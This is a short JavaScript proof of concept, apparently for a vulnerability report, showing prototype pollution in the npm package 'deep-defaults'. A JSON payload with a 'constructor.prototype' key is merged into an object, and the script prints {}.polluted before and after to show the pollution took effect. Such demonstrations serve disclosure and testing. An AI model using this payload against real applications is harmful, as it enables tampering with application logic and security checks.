var deepDefaults = require('deep-defaults');
var malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
var obj = {};
console.log({}.polluted);
deepDefaults(obj, JSON.parse(malicious_payload));
console.log({}.polluted);